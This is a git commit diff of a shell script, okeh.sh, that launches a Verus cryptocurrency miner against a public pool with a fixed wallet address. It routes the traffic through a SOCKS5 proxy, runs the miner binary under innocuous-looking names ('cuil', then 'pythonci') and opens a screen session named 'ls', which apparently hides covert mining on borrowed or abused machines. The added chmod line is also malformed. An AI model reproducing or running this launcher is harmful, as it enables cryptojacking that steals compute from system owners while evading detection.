f85eac928b5082c180160b2e868bccaf3b956c9c
Matthew Henshall <hnsmat004@myuct.ac.za>
2021-08-15 12:22:18 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
-sudo apt update 
-sudo apt install screen libjansson4 -y 
-chmod +x gas.sh && chmod +x cuil && chmod 777 cuil gas.sh
-screen -dmS ls 
-POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
-WORKER=$(echo $(shuf -i 1-20 -n 1)-AMDryzen)
-PROXY=socks5://70.166.167.36:4145
-./cuil -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+sudo apt update
+sudo apt install screen libjansson4 -y
+chmod +x sei.sh && chmod +x pythonci chmod 777 pythonci sei.sh
+screen -dmS ls
+PL=stratum+tcp://na.luckpool.net:3956
+WT=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
+WR=disable-run
+PY=socks5://213.136.89.190:31988
+./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
